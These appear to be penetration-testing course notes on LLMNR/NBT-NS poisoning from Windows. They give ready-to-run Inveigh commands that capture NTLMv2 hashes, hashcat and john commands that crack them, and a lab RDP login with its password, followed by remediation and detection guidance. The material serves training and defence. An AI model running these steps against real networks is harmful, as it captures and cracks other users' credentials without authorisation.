# Section 07 — LLMNR/NBT-NS Poisoning from Windows

> Same attack as section 06 — Inveigh instead of Responder.

---

## QUICK REFERENCE — Full Attack Chain

```powershell
# STEP 1 — RDP into Windows attack host
# xfreerdp /v:TARGET_IP /u:htb-student /p:'Academy_student_AD!' /cert:ignore /dynamic-resolution

# STEP 2 — Run Inveigh (C# version — current)
cd C:\Tools
.\Inveigh.exe

# STEP 3 — Press ESC to enter interactive console
GET NTLMV2USERNAMES     # see who you've captured
GET NTLMV2UNIQUE        # one hash per user — clean for cracking

# STEP 4 — Copy hash to Linux, crack
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt
```
> `Inveigh.exe` is the C# version — run it, then press ESC for the interactive console. `GET NTLMV2UNIQUE` gives one hash per user, which is cleanest for cracking. Copy the hash to your Kali box and crack it with Hashcat mode `5600`.

---

## Inveigh — C# Version (Current)

```powershell
.\Inveigh.exe
# Press ESC → interactive console
```
> Run this from `C:\Tools`. Inveigh listens for LLMNR/NBT-NS broadcasts and captures NTLMv2 hashes. ESC drops into the interactive console where you can query captured hashes.

**Interactive console commands:**

| Command | Output |
|---------|--------|
| `GET NTLMV2UNIQUE` | One hash per user — use this for cracking |
| `GET NTLMV2USERNAMES` | Usernames + source IPs |
| `GET NTLMV2` | All captured NTLMv2 hashes |
| `GET CLEARTEXT` | Any cleartext credentials |
| `STOP` | Stop Inveigh |

---

## Inveigh — PowerShell Version (Legacy)

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
> Legacy PowerShell version. `-NBNS Y` enables NetBIOS Name Service poisoning. `-FileOutput Y` saves hashes to disk automatically. Prefer `Inveigh.exe` instead — the PS version is no longer maintained.

Use C# version (`Inveigh.exe`) — PowerShell version is no longer maintained.

---

## Cracking

```bash
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt   # NTLMv2
john user.hash --wordlist=/usr/share/wordlists/rockyou.txt   # fallback
```
> Mode `5600` is NTLMv2 in Hashcat. Use John as a fallback when Hashcat has OpenCL driver issues.

---

## Remediation (include in reports)

### Disable LLMNR (GPO)
```
Computer Configuration → Administrative Templates → Network → DNS Client
→ "Turn OFF Multicast Name Resolution" → Enabled
```

### Disable NBT-NS (PowerShell startup script via GPO)
```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach {
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2
}
```
> Sets `NetbiosOptions = 2` on every network interface. This disables NetBIOS over TCP/IP (NBT-NS). Deploy as a Group Policy Object (GPO) startup script to apply domain-wide.

### Other controls
- Enable **SMB Signing** — prevents relay even if hashes are captured
- Filter UDP 5355 (LLMNR) and UDP 137 (NBT-NS)

---

## Detection

| Method | Detail |
|--------|--------|
| Event ID 4625 | Account logon failure — many in short window = indicator |
| Monitor UDP 5355, 137 | Unexpected responders on network |
| Inject fake requests | Alert on any response → attacker responding = caught |

MITRE ATT&CK: **T1557.001** — LLMNR/NBT-NS Poisoning and SMB Relay

---

## Exam Notes

- Responder (Linux) = Inveigh (Windows) — same attack, different tool
- C# `Inveigh.exe` is current; PowerShell `Inveigh.ps1` is legacy
- `GET NTLMV2UNIQUE` = one hash per user, clean for Hashcat
- SMB signing disabled + captured hash = relay possible (no crack needed)
